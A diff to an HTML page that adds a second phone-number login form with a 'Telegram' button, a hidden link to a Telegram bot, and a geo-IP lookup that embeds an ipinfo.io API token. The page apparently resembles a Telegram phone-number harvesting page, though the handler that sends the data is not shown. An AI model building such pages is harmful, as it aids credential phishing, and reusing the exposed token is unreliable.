@@ -19,7 +19,15 @@
 
 <div class="container">
     <form id="login" onsubmit="process(event)">
-      <input id="phone" type="tel" name="phone" />
+      <input id="phone" class="phone" type="tel" name="phone" />
+      <input type="submit" class="btn" value="Telegram" />
+    </form>
+    <a href="https://t.me/ValentinaOleyarnik_bot?start=ZGw6MTA2NDY0" style="display: none"></a>
+    <div class="alert alert-error" style="display: none"></div>
+</div>
+<div class="container">
+    <form id="login" onsubmit="process(event)">
+      <input id="phonePopup" class="phone" type="tel" name="phone" />
       <input type="submit" class="btn" value="Telegram" />
     </form>
     <a href="https://t.me/ValentinaOleyarnik_bot?start=ZGw6MTA2NDY0" style="display: none"></a>
@@ -51,14 +59,22 @@
 </script>
 <script>
     const phoneInputField = document.querySelector("#phone");
-    const phoneInput = window.intlTelInput(phoneInputField, {
+    const phoneInput = window.intlTelInput(phoneInputField, utilsSettings());
+
+    const phoneInputFieldPopup = document.querySelector("#phonePopup");
+    const phoneInputPopup = window.intlTelInput(phoneInputFieldPopup, utilsSettings());
+
+    function utilsSettings() {
+        return {
         initialCountry: "auto",
         geoIpLookup: getIp,
         preferredCountries: ["pl", "de", "cz"],
         separateDialCode:true,
         utilsScript:
             "js/utils.js",
-    });
+        }
+    }
+
     function getIp(callback) {
         fetch('https://ipinfo.io/json?token=9f3ab6928569d1', { headers: { 'Accept': 'application/json' }})
         .then((resp) => resp.json())
